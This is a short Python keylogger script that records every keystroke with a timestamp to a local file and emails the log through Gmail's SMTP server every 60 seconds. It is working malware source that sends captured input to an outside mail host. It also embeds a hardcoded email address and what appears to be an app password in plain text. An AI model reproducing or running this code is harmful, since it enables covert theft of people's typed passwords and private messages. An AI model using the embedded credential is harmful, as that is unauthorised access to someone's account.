from pynput import keyboard
from datetime import datetime
import smtplib
import threading
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Log file path
LOG_FILE = "keylog.txt"

# Email configuration
EMAIL = "snehachhatri7@gmail.com"
PASSWORD = "uaiy pkjo oyjk pelf"
TO_EMAIL = "snehachhatri7@gmail.com"

def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"[{timestamp}] {key.char}\n")
    except AttributeError:
        with open(LOG_FILE, "a") as f:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"[{timestamp}] [{key}]\n")

def on_release(key):
    if key == keyboard.Key.esc:
        print("\n[*] Keylogger stopped.")
        return False

def send_email():
    try:
        with open(LOG_FILE, "r") as f:
            content = f.read()

        if not content:
            return

        msg = MIMEMultipart()
        msg["From"] = EMAIL
        msg["To"] = TO_EMAIL
        msg["Subject"] = "Keylogger Report"
        msg.attach(MIMEText(content, "plain"))

        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(EMAIL, PASSWORD)
        server.send_message(msg)
        server.quit()
        print("[*] Email sent successfully!")
    except Exception as e:
        print(f"[!] Email failed: {e}")

def email_timer():
    send_email()
    timer = threading.Timer(60, email_timer)
    timer.daemon = True
    timer.start()

# Main
print("[*] Keylogger started... Press ESC to stop.")
print(f"[*] Logging to: {LOG_FILE}")
print("[*] Email will be sent every 60 seconds\n")

email_timer()

with keyboard.Listener(
    on_press=on_press,
    on_release=on_release
) as listener:
    listener.join()